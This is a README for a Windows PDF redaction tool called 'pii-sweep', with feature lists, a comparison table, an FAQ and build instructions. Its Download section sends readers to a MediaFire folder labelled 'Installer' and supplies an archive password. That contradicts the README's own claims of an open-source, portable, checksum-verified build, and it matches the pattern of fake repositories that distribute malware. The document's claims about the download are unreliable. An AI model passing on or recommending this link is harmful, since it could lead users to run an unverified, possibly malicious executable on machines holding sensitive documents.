# pii-sweep

🕵️ Free, open-source PII redactor for Windows — find and black out names, emails and IDs in PDFs locally. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local detection** — a bundled NER model plus pattern rules find names, emails, phones and IBANs on your machine
- ✅ **Review list before redaction** — every hit shown with context; uncheck false positives in one pass
- ✅ **Real blackout** — text removals flatten the PDF so the words cannot be copied back out
- ✅ **Replace modes** — black box, white box or token replacement like PERSON_1 for readable versions
- ✅ **Batch folders** — a hundred contracts swept with the same ruleset and one summary report
- ✅ **Rule editor** — custom patterns for internal ID formats added in a small expression builder
- ✅ **100 MB self-contained exe** — runtime and model bundled, portable, offline, MIT with SHA-256 releases

## Why pii-sweep

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **pii-sweep** | Presidio scripts | Cloud redaction | Manual black boxes |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Paid per page | Your evening |
| Open source | **Yes** | Yes | No | N/A
| Documents stay local | **Yes** | Yes | Upload | Yes
| Flattened PDF output | **Yes** | No | Partial | Partial
| Batch with report | **Yes** | Scripted | Partial | No
| Portable, no install | **Yes, 100 MB** | Python env | Browser | Editor

## FAQ

**how to redact personal data from PDFs without uploading them?**

Drawing black boxes in an editor often leaves the text underneath recoverable, and cloud redaction means uploading exactly the documents you are protecting. pii-sweep detects entities locally, reviews hits with you and writes flattened redactions. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark redactor (#121418, red #DC2626): document page left with highlighted hits, review list right grouped by entity type, uncheck controls per row.
2. Redaction preview: before and after page thumbnails, black box mode selected, flatten checkbox locked on, count chip reading 48 redactions.
3. Batch summary: 100 contracts processed, per-file hit counts in a table, report export button, ruleset name chip reading gdpr-basic.

## Download

| Source | Link |
|---|---|
| 💾 **Installer pii-sweep** | [Installer pii-sweep](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).